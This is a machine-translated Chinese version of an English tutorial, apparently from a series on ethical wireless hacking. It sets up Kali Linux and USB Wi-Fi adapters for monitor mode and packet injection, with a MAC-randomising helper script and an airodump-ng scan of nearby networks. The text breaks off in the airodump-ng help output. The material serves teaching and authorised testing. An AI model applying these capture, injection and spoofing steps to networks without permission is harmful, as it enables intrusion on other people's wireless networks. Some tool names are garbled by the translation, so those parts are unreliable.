<html>
<head>
<title>Wireless Security and Hacking</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">无线安全和黑客攻击</h1>
<blockquote>原文：<a href="https://levelup.gitconnected.com/ethical-hacking-part-14-wireless-hacking-cd44cd1445b7?source=collection_archive---------0-----------------------#2020-10-26">https://levelup.gitconnected.com/ethical-hacking-part-14-wireless-hacking-cd44cd1445b7?source=collection_archive---------0-----------------------#2020-10-26</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="040c" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">道德黑客，了解防范攻击的风险——如何访问无线网络</h2></div><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ki"><img src="../Images/c02e1050504e75919b80a0cca78c30a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-Y_L7MAgeWYybbOOH0jdHg.png"/></div></div></figure><p id="1bf7" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">很多人都要求这篇文章，所以这里去:)</p><p id="0895" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">为了完成本教程，您需要以下内容:</p><ul class=""><li id="24d5" class="lq lr it kw b kx ky la lb ld ls lh lt ll lu lp lv lw lx ly bi translated">Kali Linux</li><li id="d3d3" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated">支持<strong class="kw iu">监控</strong>和<strong class="kw iu">数据包注入</strong>的无线USB芯片组</li><li id="9036" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated">如果您使用的是虚拟盒子，<a class="ae me" href="https://www.virtualbox.org/wiki/Downloads" rel="noopener ugc nofollow" target="_blank"> <strong class="kw iu">下载并安装最新版本的虚拟盒子和扩展包</strong> </a>。这一点很重要，你需要确保你运行的是最新版本的“<a class="ae me" href="https://www.virtualbox.org/wiki/Downloads" rel="noopener ugc nofollow" target="_blank"> <strong class="kw iu">【虚拟盒子】</strong> </a>”和“<a class="ae me" href="https://www.virtualbox.org/wiki/Downloads" rel="noopener ugc nofollow" target="_blank"> <strong class="kw iu"> Oracle VM VirtualBox扩展包</strong> </a>”。</li></ul><p id="6eb5" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">大多数网卡不支持“<strong class="kw iu">监控模式</strong>”和“<strong class="kw iu">数据包注入</strong>”，而这对于道德黑客和渗透测试是必不可少的。只要他们使用的芯片组支持我们需要的功能，你使用的制造商是无关紧要的。</p><p id="2ac7" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated"><strong class="kw iu">最受欢迎的Kali Linux Pen测试芯片组</strong></p><ul class=""><li id="f81f" class="lq lr it kw b kx ky la lb ld ls lh lt ll lu lp lv lw lx ly bi translated"><strong class="kw iu">阿尔法AWUS036NHA </strong></li><li id="964c" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated">阿瑟罗斯AR9271</li><li id="fdfb" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated">雷凌RT3070</li><li id="6160" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated">雷凌RT3572</li><li id="089e" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated">雷凌RT5572</li><li id="ba09" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated"><strong class="kw iu"> Realtek RTL8812AU </strong></li><li id="f0d5" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated">雷凌RT5370N</li></ul><p id="e3fd" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">到目前为止，我们一直使用Kali Linux作为虚拟机器安装。这需要一些努力，但我们需要做一些改变。理想情况下，在可引导USB或物理安装上使用Kali会更容易，因为将无线USB NIC扩展到虚拟机并不是一件简单的事情。我将解释如何做到这一点，因为这是我如何配置我的。</p><p id="ca14" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">出于本教程的目的，我从亚马逊购买了两张卡进行测试。</p><p id="7dc4" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我在亚马逊上花23.97美元买了这个USB无线网卡:</p><ul class=""><li id="72ca" class="lq lr it kw b kx ky la lb ld ls lh lt ll lu lp lv lw lx ly bi translated"><a class="ae me" href="https://www.amazon.co.uk/gp/product/B082MSRSV7/ref=ppx_yo_dt_b_asin_title_o00_s00?ie=UTF8&amp;psc=1" rel="noopener ugc nofollow" target="_blank">WiFi Nation 802.11 AC AC 600 USB WiFi天线，适配器，无线加密狗2dBi偶极SMA天线，芯片组:Realtek RTL8811AU，双频2.4GHz或5GHz，支持Windows，macOS和linux】</a></li></ul><p id="2cfe" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我还在亚马逊上花20.49美元<strong class="kw iu">买了这个USB无线网卡，这是我推荐的卡</strong>:</p><ul class=""><li id="e28c" class="lq lr it kw b kx ky la lb ld ls lh lt ll lu lp lv lw lx ly bi translated"><a class="ae me" href="https://www.amazon.co.uk/gp/product/B004Y6MIXS/ref=ppx_yo_dt_b_asin_title_o02_s00?ie=UTF8&amp;psc=1" rel="noopener ugc nofollow" target="_blank">阿尔法网络AWUS036NHA — USB WiFi适配器，150 Mbps，802.11b/g/n，RP-SMA，AR9271L Atheros芯片组</a></li></ul><p id="d181" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">它们都可以工作，但是WiFi Nation卡在标准Kali安装中没有完全加载。它似乎被内核部分检测到，不会完全进入监控模式。我联系了他们的支持，他们让我下载Z Security的定制版本，我照做了。完全重新安装Kali并不理想，但我可以确认他们的定制版本确实有效。阿尔法卡在标准Kali安装中工作，所以如果我选择其中一个卡，我会推荐那一个。</p><h2 id="d284" class="mf mg it bd mh mi mj dn mk ml mm dp mn ld mo mp mq lh mr ms mt ll mu mv mw mx bi translated">正在为您的新USB网卡准备虚拟盒…</h2><ul class=""><li id="7c04" class="lq lr it kw b kx my la mz ld na lh nb ll nc lp lv lw lx ly bi translated"><strong class="kw iu">打开卡莉虚拟盒子的设置</strong>。</li><li id="d5f9" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated">点击<strong class="kw iu">端口</strong>，然后点击<strong class="kw iu"> USB </strong>。</li></ul><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nd"><img src="../Images/74062c2f54e05eb70eae437167bb244e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SLHzyJhwlxAm6xDVvwkxNw.png"/></div></div></figure><ul class=""><li id="7a65" class="lq lr it kw b kx ky la lb ld ls lh lt ll lu lp lv lw lx ly bi translated">点击带有<strong class="kw iu">绿色+ </strong>的USB图标</li><li id="c43f" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated">添加新的USB 3.0网卡。</li><li id="54dd" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated">双击新网卡，将“<strong class="kw iu">远程</strong>”更改为“<strong class="kw iu">是</strong></li></ul><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ne"><img src="../Images/147b35338dc50a1370b286a8506589d1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uNumy7JFdys66-26bvxmzQ.png"/></div></div></figure><ul class=""><li id="b49e" class="lq lr it kw b kx ky la lb ld ls lh lt ll lu lp lv lw lx ly bi translated">当你的Kali虚拟盒子启动时，点击“<strong class="kw iu">设备</strong>”虚拟盒子菜单，然后点击“<strong class="kw iu"> USB </strong>”，然后点击你的无线网卡。在我的案例中“<strong class="kw iu"> Realtek 802.11ac WAN适配器【0200】</strong>”。如果你不这样做，USB将不会虚拟连接，Kali不会检测到它。如果您在启动时没有做到这一点，您仍然可以稍后再做。这就像在你的操作系统中插入一个USB接口，它会被检测出来，然后你就可以离开了。</li></ul><h2 id="b94b" class="mf mg it bd mh mi mj dn mk ml mm dp mn ld mo mp mq lh mr ms mt ll mu mv mw mx bi translated">正在安装USB无线设备…</h2><ul class=""><li id="d85c" class="lq lr it kw b kx my la mz ld na lh nb ll nc lp lv lw lx ly bi translated">引导并登录到Kali Linux</li><li id="862c" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated">打开一个终端，sudo到root</li></ul><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="e3ea" class="mf mg it ng b gy nk nl l nm nn">kali@kali:~$ <strong class="ng iu">sudo su -</strong><br/>[sudo] password for kali: <br/>root@kali:~#</span></pre><ul class=""><li id="95c2" class="lq lr it kw b kx ky la lb ld ls lh lt ll lu lp lv lw lx ly bi translated">打开“<strong class="kw iu"> /etc/apt/sources.list </strong>”，确保两个repos都有注释。</li></ul><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="5949" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">vi /etc/apt/sources.list</strong></span><span id="4419" class="mf mg it ng b gy no nl l nm nn">deb <a class="ae me" href="http://http.kali.org/kali" rel="noopener ugc nofollow" target="_blank">http://http.kali.org/kali</a> kali-last-snapshot main non-free contrib<br/>deb-src <a class="ae me" href="http://http.kali.org/kali" rel="noopener ugc nofollow" target="_blank">http://http.kali.org/kali</a> kali-rolling main non-free contrib</span></pre><ul class=""><li id="ef78" class="lq lr it kw b kx ky la lb ld ls lh lt ll lu lp lv lw lx ly bi translated">确保您的系统是最新的。</li></ul><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="94ff" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">apt-get update -y &amp;&amp; apt-get upgrade -y</strong><br/>Hit:1 <a class="ae me" href="http://kali.download/kali" rel="noopener ugc nofollow" target="_blank">http://kali.download/kali</a> kali-rolling InRelease<br/>Reading package lists... Done<br/>Reading package lists... Done<br/>Building dependency tree       <br/>Reading state information... Done<br/>Calculating upgrade... Done<br/>0 upgraded, 0 newly installed, 0 to remove and 111 not upgraded.<br/>root@kali:~#</span></pre><ul class=""><li id="36f6" class="lq lr it kw b kx ky la lb ld ls lh lt ll lu lp lv lw lx ly bi translated">如果您使用的是Realtek卡，您需要为“<strong class="kw iu"> Realtek RTL8811AU芯片组</strong>”网卡安装驱动程序。</li></ul><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="9568" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">apt-get install realtek-rtl88xxau-dkms -y</strong><br/>Reading package lists... Done<br/>Building dependency tree       <br/>Reading state information... Done<br/>realtek-rtl88xxau-dkms is already the newest version (5.6.4.2~git20200916-0kali1).<br/>0 upgraded, 0 newly installed, 0 to remove and 111 not upgraded.<br/>root@kali:~#</span></pre><ul class=""><li id="efa5" class="lq lr it kw b kx ky la lb ld ls lh lt ll lu lp lv lw lx ly bi translated">如果你使用的是Alfa卡，你需要做的就是安装Atheros固件。这个卡是迄今为止最容易安装和正常的Kali安装工程。如果你要为卡莉买一张卡，这是我推荐的。</li></ul><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="23d5" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">apt-get install firmware-atheros -y</strong></span></pre><ul class=""><li id="d936" class="lq lr it kw b kx ky la lb ld ls lh lt ll lu lp lv lw lx ly bi translated">你现在需要完全关闭你的机器，不要保存状态。</li></ul><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="bf98" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">poweroff</strong></span></pre><ul class=""><li id="657f" class="lq lr it kw b kx ky la lb ld ls lh lt ll lu lp lv lw lx ly bi translated">如果你使用的是WiFi国家卡，他们的安装说明会稍微复杂一些。正如我提到的，这实际上对我不起作用，我最终不得不安装<a class="ae me" href="https://medium.com/r?url=https%3A%2F%2Fzsecurity.org%2Fdownload-custom-kali%2F" rel="noopener"> Z安全定制的Kali build </a>来让它工作。</li></ul><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="32a4" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">apt install git</strong><br/>root@kali:~# <strong class="ng iu">dkms git clone </strong><a class="ae me" href="https://github.com/gnab/rtl8812au.git" rel="noopener ugc nofollow" target="_blank"><strong class="ng iu">https://github.com/gnab/rtl8812au.git</strong></a><br/>root@kali:~# <strong class="ng iu">cp -r rtl8812au /usr/src/rtl8812au-4.2.2</strong><br/>root@kali:~# <strong class="ng iu">dkms add -m rtl8812au -v 4.2.2</strong><br/>root@kali:~# <strong class="ng iu">dkms build -m rtl8812au -v 4.2.2</strong><br/>root@kali:~# <strong class="ng iu">dkms install -m rtl8812au -v 4.2.2</strong></span></pre><ul class=""><li id="41ce" class="lq lr it kw b kx ky la lb ld ls lh lt ll lu lp lv lw lx ly bi translated">重启后，运行检查模块是否已安装。</li></ul><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="0b3d" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">modprobe 8812au</strong></span></pre><p id="4230" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">最糟糕的部分是试图让Kali正确地检测支持“<strong class="kw iu">监控模式</strong>”和“<strong class="kw iu">数据包注入</strong>”的USB网卡，但是一旦你让它工作，你就可以开始了。</p><h2 id="8172" class="mf mg it bd mh mi mj dn mk ml mm dp mn ld mo mp mq lh mr ms mt ll mu mv mw mx bi translated">“监控模式”有效吗？</h2><p id="88d5" class="pw-post-body-paragraph ku kv it kw b kx my ju kz la mz jx lc ld np lf lg lh nq lj lk ll nr ln lo lp im bi translated">您需要运行一些诊断命令来确认一切正常。如果您在每个命令中看不到您的"<strong class="kw iu"> wlan0 </strong>"或等效接口，那么您的卡没有被Kali正确检测到。我在Kali使用WiFi Nation卡时遇到的一个问题是，除了“<strong class="kw iu"> iw </strong>”之外，所有命令都显示在界面上。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="c9e3" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">iw dev</strong><br/><strong class="ng iu">phy#1<br/> Interface wlan0<br/>  ifindex 4<br/>  wdev 0x100000001<br/>  addr 22:92:14:15:1a:06<br/>  type managed<br/>  channel 1 (2412 MHz), width: 20 MHz, center1: 2412 MHz<br/>  txpower 18.00 dBm</strong></span><span id="67a7" class="mf mg it ng b gy no nl l nm nn">root@kali:~# <strong class="ng iu">lsusb</strong><br/>Bus 002 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hub<br/><strong class="ng iu">Bus 001 Device 005: ID 0bda:0811 Realtek Semiconductor Corp. 802.11ac WLAN Adapter </strong><br/>Bus 001 Device 004: ID 80ee:0021 VirtualBox USB Tablet<br/>Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub</span><span id="8690" class="mf mg it ng b gy no nl l nm nn">root@kali:~# <strong class="ng iu">ifconfig</strong><br/>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br/>        inet 192.168.1.2  netmask 255.255.255.0  broadcast 192.168.1.255<br/>        ether 08:00:27:61:84:e4  txqueuelen 1000  (Ethernet)<br/>        RX packets 2574  bytes 1126619 (1.0 MiB)<br/>        RX errors 0  dropped 944  overruns 0  frame 0<br/>        TX packets 728  bytes 83874 (81.9 KiB)<br/>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><span id="1f43" class="mf mg it ng b gy no nl l nm nn">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536<br/>        inet 127.0.0.1  netmask 255.0.0.0<br/>        loop  txqueuelen 1000  (Local Loopback)<br/>        RX packets 15  bytes 729 (729.0 B)<br/>        RX errors 0  dropped 0  overruns 0  frame 0<br/>        TX packets 15  bytes 729 (729.0 B)<br/>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><span id="078c" class="mf mg it ng b gy no nl l nm nn"><strong class="ng iu">wlan0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 2312<br/>        ether 22:92:14:15:1a:06  txqueuelen 1000  (Ethernet)<br/>        RX packets 0  bytes 0 (0.0 B)<br/>        RX errors 0  dropped 0  overruns 0  frame 0<br/>        TX packets 0  bytes 0 (0.0 B)<br/>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</strong></span><span id="1dc0" class="mf mg it ng b gy no nl l nm nn">root@kali:~# ip link<br/>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000<br/>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br/>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP mode DEFAULT group default qlen 1000<br/>    link/ether 08:00:27:61:84:e4 brd ff:ff:ff:ff:ff:ff<br/><strong class="ng iu">4: wlan0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 2312 qdisc mq state DORMANT mode DORMANT group default qlen 1000<br/>    link/ether 22:92:14:15:1a:06 brd ff:ff:ff:ff:ff:ff</strong></span><span id="0ddd" class="mf mg it ng b gy no nl l nm nn">root@kali:~# <strong class="ng iu">iwconfig</strong><br/>lo        no wireless extensions.</span><span id="c085" class="mf mg it ng b gy no nl l nm nn"><strong class="ng iu">wlan0     IEEE 802.11  ESSID:off/any  <br/>          Mode:Managed  Access Point: Not-Associated   Tx-Power=18 dBm   <br/>          Retry short limit:7   RTS thr:off   Fragment thr:off<br/>          Encryption key:off<br/>          Power Management:off</strong><br/>          <br/>eth0      no wireless extensions.</span></pre><p id="5941" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">如您所见，该卡目前处于“<strong class="kw iu">管理的</strong>模式。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="85d3" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">iw dev</strong><br/>phy#1<br/> Interface wlan0<br/>  ifindex 4<br/>  wdev 0x100000001<br/>  addr 92:6a:88:99:a9:fa<br/>  type <strong class="ng iu">managed</strong><br/>  channel 1 (2412 MHz), width: 20 MHz, center1: 2412 MHz<br/>  txpower 18.00 dBm</span></pre><p id="b2ae" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我们想将其更改为“<strong class="kw iu">监视器</strong>模式。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="0812" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">ip link set wlan0 down</strong><br/>root@kali:~# <strong class="ng iu">iwconfig wlan0 mode monitor</strong><br/>root@kali:~# <strong class="ng iu">ip link set wlan0 up</strong><br/>root@kali:~# <strong class="ng iu">iw dev</strong><br/>phy#1<br/> Interface wlan0<br/>  ifindex 4<br/>  wdev 0x100000001<br/>  addr 92:6a:88:99:a9:fa<br/>  type <strong class="ng iu">monitor</strong><br/>  channel 1 (2412 MHz), width: 20 MHz, center1: 2412 MHz<br/>  txpower 18.00 dBm</span></pre><p id="95e7" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">有一点令人困惑的是，将无线网卡置于“<strong class="kw iu"> monitor </strong>”模式可能会也可能不会创建另一个名为“<strong class="kw iu"> wlan0mon </strong>”的虚拟接口。我读过的几乎所有文档都指出应该创建这个接口。然而，我确实发现有些卡(比如我正在使用的卡)不能创建另一个接口，也不能在现有的"<strong class="kw iu"> wlan0 </strong>"上进行监控。当你把卡放入<strong class="kw iu">监控模式</strong>时，运行<strong class="kw iu"> ifconfig </strong>。如果你看到“<strong class="kw iu"> wlan0mon </strong>”，那么使用那个，否则使用“<strong class="kw iu"> wlan0 </strong>”。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="4065" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">airmon-ng check kill</strong></span><span id="3605" class="mf mg it ng b gy no nl l nm nn">Killing these processes:</span><span id="6522" class="mf mg it ng b gy no nl l nm nn">PID Name<br/>    613 wpa_supplicant</span><span id="d323" class="mf mg it ng b gy no nl l nm nn">root@kali:~# <strong class="ng iu">airmon-ng start wlan0</strong></span><span id="3731" class="mf mg it ng b gy no nl l nm nn">PHY Interface Driver  Chipset</span><span id="9db9" class="mf mg it ng b gy no nl l nm nn">phy1 wlan0  88XXau  Realtek Semiconductor Corp. 802.11ac WLAN Adapter <br/> (monitor mode enabled)</span></pre><p id="7797" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">确认监控正在工作…</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="3a19" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">airodump-ng wlan0</strong>  &lt;--   or your wlan0mon</span><span id="e70a" class="mf mg it ng b gy no nl l nm nn">CH 10 ][ Elapsed: 6 s ][ 2020-10-25 17:03</span><span id="4fd6" class="mf mg it ng b gy no nl l nm nn">BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span><span id="8278" class="mf mg it ng b gy no nl l nm nn">C0:3E:0F:2A:F4:8D   -1        0        3    0   1   -1   WPA              &lt;length:  0&gt;                <br/> 26:4C:E3:5C:8E:73  -22        4        0    0   1  130   WPA2 CCMP   PSK  &lt;length: 21&gt;                <br/> E8:AD:A6:E0:45:A4  -57       20       13    0   6  195   WPA2 CCMP   PSK  REMOVED                <br/> EA:AD:A6:E0:47:A5  -56       23        0    0   6  195   OPN              REMOVED                    <br/> AC:84:C6:55:95:B8  -79       10        0    0  11  270   WPA2 CCMP   PSK  REMOVED                 <br/> 58:EF:68:07:BE:07  -81        5        0    0   1  130   WPA2 CCMP   PSK  REMOVED                    <br/> D0:57:94:B8:AC:F6  -74        5        0    0   1  130   WPA2 CCMP   PSK  REMOVED               <br/> AC:E2:D3:31:2A:14  -105        5        0    0   6   65   WPA2 CCMP   PSK  &lt;length: 23&gt;</span><span id="eb9b" class="mf mg it ng b gy no nl l nm nn">BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes</span><span id="21a6" class="mf mg it ng b gy no nl l nm nn">(not associated)   54:E0:19:6F:17:54  -49    0 - 1      8        8                                    <br/> C0:3E:0F:2A:F4:8D  FC:A1:83:93:55:C9  -55    0 -24e     0       10                                    <br/> 58:EF:68:07:BE:07  24:4C:E3:5C:0E:73  -23    0 -24e     0        3                                    <br/> 58:EF:68:07:BE:07  68:54:FD:C4:19:B5  -44    0 -24e     0       17</span></pre><h2 id="c952" class="mf mg it bd mh mi mj dn mk ml mm dp mn ld mo mp mq lh mr ms mt ll mu mv mw mx bi translated">“包注入”有效吗？</h2><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="0621" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">aireplay-ng -9 wlan0</strong><br/>17:06:08  Trying broadcast probe requests...<br/>17:06:10  No Answer...<br/>17:06:10  Found 1 AP</span><span id="6cd8" class="mf mg it ng b gy no nl l nm nn">17:06:10  Trying directed probe requests...<br/>17:06:10  AC:84:C6:55:95:B8 - channel: 11 - 'REMOVED'<br/>17:06:11  Ping (min/avg/max): 1.489ms/5.576ms/23.743ms Power: -77.71<br/>17:06:11  28/30:  93%</span><span id="c851" class="mf mg it ng b gy no nl l nm nn">17:06:11  Injection is working!</span></pre><h2 id="75b9" class="mf mg it bd mh mi mj dn mk ml mm dp mn ld mo mp mq lh mr ms mt ll mu mv mw mx bi translated">让生活变得简单一点…</h2><p id="041c" class="pw-post-body-paragraph ku kv it kw b kx my ju kz la mz jx lc ld np lf lg lh nq lj lk ll nr ln lo lp im bi translated">在“<strong class="kw iu">监控</strong>”模式和“<strong class="kw iu">管理</strong>”模式之间切换有点痛苦，因为有几个命令要运行。更简单的方法是创建一些简单的bash脚本来自动完成它们。</p><p id="8f78" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">首先，让我们创建两个空文件，并授予它们执行权限。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="24e9" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">touch monitor.sh</strong><br/>root@kali:~# <strong class="ng iu">chmod +x monitor.sh</strong></span><span id="2936" class="mf mg it ng b gy no nl l nm nn">root@kali:~# <strong class="ng iu">touch managed.sh</strong><br/>root@kali:~# <strong class="ng iu">chmod +x managed.sh</strong></span></pre><p id="97c9" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">找到bash在系统中的位置。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="a480" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">which bash</strong><br/>/usr/bin/bash</span></pre><p id="9300" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">编辑您的“<strong class="kw iu"> monitor.sh </strong>”文件，并添加以下内容。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="0f2f" class="mf mg it ng b gy nk nl l nm nn">#!/usr/bin/bash</span><span id="9a57" class="mf mg it ng b gy no nl l nm nn">airmon-ng check kill<br/>ip link set wlan0 down<br/>macchanger -r wlan0<br/>iwconfig wlan0 mode monitor<br/>ip link set wlan0 up<br/>iw dev | grep type</span></pre><p id="f88e" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">如果第一行中你的bash位置和我的不同，那就改变它。我还把你的mac地址改成随机的。如果您正在测试一个网络(经过许可)，您可能希望模拟一次真实攻击。</p><p id="4023" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">编辑您的“<strong class="kw iu"> managed.sh </strong>”文件，并添加以下内容。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="6a77" class="mf mg it ng b gy nk nl l nm nn">#!/usr/bin/bash</span><span id="fd7f" class="mf mg it ng b gy no nl l nm nn">service NetworkManager restart<br/>ip link set wlan0 down<br/>iwconfig wlan0 mode managed<br/>ip link set wlan0 up<br/>iw dev | grep type</span></pre><h1 id="c90b" class="ns mg it bd mh nt nu nv mk nw nx ny mn jz nz ka mq kc oa kd mt kf ob kg mw oc bi translated">这仅用于教育或专业目的！未经允许不要攻击无线网络！</h1><p id="6003" class="pw-post-body-paragraph ku kv it kw b kx my ju kz la mz jx lc ld np lf lg lh nq lj lk ll nr ln lo lp im bi translated">让我们看看各种工具以及如何使用它们…</p><h2 id="3720" class="mf mg it bd mh mi mj dn mk ml mm dp mn ld mo mp mq lh mr ms mt ll mu mv mw mx bi translated">空气溶解剂</h2><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="a6a4" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">airodump-ng --help</strong></span><span id="ba48" class="mf mg it ng b gy no nl l nm nn">Airodump-ng 1.6  - (C) 2006-2020 Thomas d'Otreppe<br/>  <a class="ae me" href="https://www.aircrack-ng.org" rel="noopener ugc nofollow" target="_blank">https://www.aircrack-ng.org</a></span><span id="11f6" class="mf mg it ng b gy no nl l nm nn">usage: airodump-ng &lt;options&gt; &lt;interface&gt;[,&lt;interface&gt;,...]</span><span id="fab3" class="mf mg it ng b gy no nl l nm nn">Options:<br/>      --ivs                 : Save only captured IVs<br/>      --gpsd                : Use GPSd<br/>      --write      &lt;prefix&gt; : Dump file prefix<br/>      -w                    : same as --write <br/>      --beacons             : Record all beacons in dump file<br/>      --update       &lt;secs&gt; : Display update delay in seconds<br/>      --showack             : Prints ack/cts/rts statistics<br/>      -h                    : Hides known stations for --showack<br/>      -f            &lt;msecs&gt; : Time in ms between hopping channels<br/>      --berlin       &lt;secs&gt; : Time before removing the AP/client<br/>                              from the screen when no more packets<br/>                              are received (Default: 120 seconds)<br/>      -r             &lt;file&gt; : Read packets from that file<br/>      -T                    : While reading packets from a file,<br/>                              simulate the arrival rate of them<br/>                              as if they were "live".<br/>      -x            &lt;msecs&gt; : Active Scanning Simulation<br/>      --manufacturer        : Display manufacturer from IEEE OUI list<br/>      --uptime              : Display AP Uptime from Beacon Timestamp<br/>      --wps                 : Display WPS information (if any)<br/>      --output-format<br/>                  &lt;formats&gt; : Output format. Possible 